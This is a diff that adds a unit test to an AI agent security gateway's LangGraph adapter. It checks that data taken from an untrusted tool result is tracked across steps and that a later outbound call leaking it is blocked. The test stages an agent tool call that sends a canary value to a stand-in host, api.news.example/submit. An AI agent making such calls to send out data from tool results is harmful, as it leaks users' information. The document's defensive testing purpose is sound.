@@ -219,6 +219,96 @@ class LangGraphAdapterTests(unittest.TestCase):
         importlib.util.find_spec("langchain_core"),
         "langchain-core is an optional LangGraph adapter dependency",
     )
+    def test_multistep_provenance_blocks_tainted_outbound_value(self) -> None:
+        from langchain_core.messages import AIMessage
+
+        canary = "AGENTGUARD_DYNAMIC_CANARY_abcdef0123456789abcdef0123456789"
+        self.adapter.gateway.registry.attach_handler(
+            "kb.search",
+            lambda _params: ToolResult(
+                ok=True,
+                output={"record_identifier": canary, "summary": "benign evidence"},
+            ),
+        )
+        first = self.adapter.tool_node(
+            {
+                "messages": [
+                    AIMessage(
+                        content="",
+                        tool_calls=[
+                            {
+                                "name": self.adapter.to_framework_tool_name("kb.search"),
+                                "args": {"query": "endpoint containment", "top_k": 2},
+                                "id": "call-taint-source",
+                            }
+                        ],
+                    )
+                ],
+                "agentguard_source_content": "initial untrusted task",
+                "agentguard_declared_purpose": "Triage an alert.",
+            }
+        )
+        second = self.adapter.tool_node(
+            {
+                "messages": [
+                    AIMessage(
+                        content="",
+                        tool_calls=[
+                            {
+                                "name": self.adapter.to_framework_tool_name("file.read"),
+                                "args": {"path": "data/demo_workspace/public/project_brief.txt"},
+                                "id": "call-benign-middle",
+                            }
+                        ],
+                    )
+                ],
+                "agentguard_source_content": first["agentguard_source_content"],
+                "agentguard_declared_purpose": "Triage an alert.",
+            }
+        )
+        accumulated = second["agentguard_source_content"]
+        self.assertIn("initial untrusted task", accumulated)
+        self.assertIn(canary, accumulated)
+
+        self.adapter.tool_node(
+            {
+                "messages": [
+                    AIMessage(
+                        content="",
+                        tool_calls=[
+                            {
+                                "name": self.adapter.to_framework_tool_name("api.get"),
+                                "args": {
+                                    "url": f"https://api.news.example/submit?record={canary}"
+                                },
+                                "id": "call-tainted-outbound",
+                            }
+                        ],
+                    )
+                ],
+                "agentguard_source_content": accumulated,
+                "agentguard_declared_purpose": "Triage an alert.",
+            }
+        )
+        step = self.adapter.steps[-1]
+        self.assertEqual(step.decision.decision.value, "block")
+        self.assertTrue(
+            any(
+                signal.signal_type.value == "sensitive_data"
+                and "Tracked data" in signal.message
+                for signal in step.decision.signals
+            )
+        )
+        self.assertNotIn(canary, str(step.decision.to_dict()))
+        self.assertNotIn(
+            canary,
+            str(self.adapter.to_agent_run("taint regression").to_dict()),
+        )
+
+    @unittest.skipUnless(
+        importlib.util.find_spec("langchain_core"),
+        "langchain-core is an optional LangGraph adapter dependency",
+    )
     def test_model_cannot_supply_security_provenance_arguments(self) -> None:
         from langchain_core.messages import AIMessage
 
